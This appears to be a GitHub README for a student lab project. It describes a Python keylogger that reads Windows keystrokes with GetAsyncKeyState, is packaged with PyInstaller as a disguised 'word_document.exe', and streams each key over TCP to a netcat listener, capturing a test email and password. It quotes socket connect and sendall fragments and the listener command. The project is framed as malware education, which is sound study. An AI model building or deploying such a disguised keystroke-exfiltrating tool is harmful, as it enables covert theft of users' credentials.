# Introduction
Keyloggers are one of the most common tools used by attackers to collect sensitive information by capturing user keystrokes. This project demonstrates how a keystroke monitoring tool works at a technical level.
The purpose of **this project is strictly educational—** to help students understand malware behavior, detection techniques, and cybersecurity defenses.
**The project is executed in a controlled lab environment using:**
* Windows Machine (victim simulation)
* Kali Linux Machine (listener/server)
* Python keylogger script converted to EXE
* Netcat listener for receiving captured keystrokes
# Objective of the Project
**The primary objectives are:**
* To understand how Windows APIs capture keyboard input.
* To analyze how keystroke data is transferred to a remote server.
* To convert a Python script into a Windows executable.
* To create a controlled simulation for monitoring keystrokes.
* To demonstrate how attackers use such techniques—and how defenders can detect them.
# Technologies Used
| Component                | Purpose                       |
| ------------------------ | ----------------------------- |
| **Python 3.10**          | Writing keylogger script      |
| **ctypes (Windows API)** | Capturing keystrokes          |
| **socket module**        | Sending data to server        |
| **PyInstaller**          | Converting Python file to EXE |
| **Kali Linux (Netcat)**  | Receiving keystrokes          |
| **Windows 11**           | Running EXE for test          |
# System Architecture
**Workflow of the Project**
* The keylogger script runs on the Windows machine.
* It captures keystrokes using the Windows API (GetAsyncKeyState).
* Each keystroke is converted into readable format.
* The data is sent to a remote listener server via a TCP socket.
* The Kali Linux Netcat listener receives and displays the keystrokes in real time.
# Implementation Steps (With Screenshot Explanation)
**Step 1 — Writing the Keylogger Script**
<img width="959" height="565" alt="Screenshot 2025-11-24 145831" src="https://github.com/user-attachments/assets/88c9940e-5a48-463b-ba01-023eea816276" />
**Key components visible:**
* *socket → used for connecting to the server*
* *ctypes.windll.user32 → calling Windows API*
* *GetAsyncKeyState() → checking every key press*
* *ASCII table mapping special keys like:*
* *[TAB], [ENTER], [SHIFT], [BACKSPACE]*
* *Auto-lowercasing when Caps Lock is off*
* *Continuous loop sending keystrokes to server*
 **This screenshot demonstrates the development environment and code logic used to capture keystrokes.**
 **Step 2 — Converting Python Script to EXE**
<img width="959" height="564" alt="Screenshot 2025-11-24 140720" src="https://github.com/user-attachments/assets/87a96343-b759-4a5d-b03b-c555c95d2d98" />
**Here, the command:**
./build.bat
**runs PyInstaller silently and generates a Windows executable**
**PyInstaller logs show:**
* Bootloader added
* Manifest embedded
* EXE successfully created
**Step 3 — Generated Executable (Payload File)**
<img width="959" height="565" alt="Screenshot 2025-11-24 140835" src="https://github.com/user-attachments/assets/989f8960-87e8-44d5-9919-7b231afcba12" />
**This shows:**
* A disguised executable named word_document.exe
* Located in the PyInstaller dist folder
* File size: ~6.9 MB
This file, when run, begins capturing keystrokes and sending them to the remote server.
**Step 4 — Setting Up the Listener on Kali Linux**
* On Kali Linux, the following command is used:
**nc -l -p 9000**
* **This opens a listening connection on port 9000.**

**Step 5 — Testing the Keylogger in a Browser**
<img width="959" height="563" alt="Screenshot 2025-11-24 142157" src="https://github.com/user-attachments/assets/474bc3f4-52ca-4485-8d78-0a7af3235e04" />
**On the left side, the Windows machine is typing:**
* **Email**: xyz34@gmail.com
* **Password**: xyz123@#$hjw#
**On the right side, the Kali terminal receives every keystroke live, including:**
* [shift]
* [lclick]
* Characters like x, y, z, @, # etc.
* [backspace] actions
**This screenshot verifies that:**
* ✔ The executable successfully runs
* ✔ Keystrokes are captured
* ✔ Data is transmitted remotely
* ✔ Listener receives input exactly as typed
# **Code Explanation (High Level)**
**1. Server Connection**
* serverAddress = ('192.168.3.117', 9000)
* clientSocket.connect(serverAddress)
* Connects Windows machine to Kali listener.
**2. Capturing Keystrokes**
* user32.GetAsyncKeyState(i)
* Hooks into OS-level keyboard events.
**3. Key Mapping**
* A custom ASCII table maps raw key codes to readable names.
**4. Sending Data**
* clientSocket.sendall(key.encode())
* Every keystroke is sent as soon as pressed.
**5. Infinite Loop**
* Script keeps monitoring keys until closed.
# **Security & Ethical Considerations**
**This project is conducted only for cybersecurity education. Real-world misuse of keyloggers is illegal and unethical.**
**Ethical learning outcomes:**
* Understanding malware helps in defending against it
* Helps develop intrusion detection tools
* Teaches importance of secure authentication mechanisms
* Demonstrates risks of untrusted executables
# **Conclusion**
**This project successfully demonstrates:**
* How keystroke monitoring works in Windows.
* How keyloggers send data remotely.
* How Python scripts are turned into EXEs.
* How a remote attacker can receive keystrokes.
* Importance of cybersecurity awareness.
The screenshots confirm that the keylogger captured sensitive input (email/password) and transmitted it over a network in real time, simulating real malware behavior—all done in a safe, controlled lab environment.
